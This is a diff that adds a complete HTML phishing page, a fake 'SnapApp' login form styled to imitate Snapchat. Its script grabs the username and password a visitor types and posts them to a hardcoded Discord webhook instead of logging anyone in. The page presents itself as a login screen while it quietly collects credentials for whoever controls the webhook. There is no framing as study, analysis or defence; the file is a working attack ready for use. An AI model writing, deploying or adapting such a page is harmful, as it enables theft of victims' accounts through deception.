@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SnapApp Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #FFFC00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: black;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-btn {
+            background: #000;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background: #333;
+        }
+        .link {
+            display: block;
+            margin-top: 10px;
+            color: blue;
+            text-decoration: none;
+        }
+    </style>
+    <script>
+        function sendToDiscord(event) {
+            event.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            const webhookURL = "https://discord.com/api/webhooks/1345629722603819018/pz-XQHvkM1WfPC_usk614NtkRPft-HzeaLiqKX6Zgr4OuqLTnlL83FhvWyOKJDXbTf0I"; 
+            
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: `Username: ${username}\nPassword: ${password}` })
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">SnapApp</div>
+        <form onsubmit="sendToDiscord(event)">
+            <input type="text" id="username" placeholder="Username or Email">
+            <input type="password" id="password" placeholder="Password">
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        <a href="#" class="link">Forgot Password?</a>
+    </div>
+</body>
+</html>
